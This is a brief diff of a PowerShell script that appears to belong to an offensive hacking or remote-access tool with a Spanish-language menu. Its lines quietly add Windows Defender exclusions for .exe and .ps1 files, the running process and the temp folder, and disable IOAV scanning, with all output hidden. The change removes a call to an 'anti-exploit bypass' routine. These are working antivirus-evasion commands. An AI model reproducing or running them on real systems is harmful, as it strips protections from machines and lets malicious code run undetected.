@@ -233,7 +233,7 @@ if($Language -in 'Spanish') {
     Write-Host -NoNewLine ; Write-Host " http://aka.ms/wmf5download" -ForegroundColor 'Blue' ; Write-Host ; sleep -milliseconds 7500 ; exit }
     else { $system = (Get-WmiObject Win32_OperatingSystem -computername $env:computername).OSArchitecture ; Add-MpPreference -ExclusionExtension ".exe" 2>&1> $null
     Add-MpPreference -ExclusionProcess $pid 2>&1> $null ; Add-MpPreference -ExclusionPath $env:temp 2>&1> $null ; Set-MpPreference -DisableIOAVProtection 1 2>&1> $null
-    Add-MpPreference -ExclusionExtension ".ps1" 2>&1> $null ; if($system -in '64 bits') { $Host.UI.RawUI.ForegroundColor = 'Black' ; Bypass-AntiExploit } else { $null }}
+    Add-MpPreference -ExclusionExtension ".ps1" 2>&1> $null }
 
     do { Show-Banner ; Show-Menu
     $currentuser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
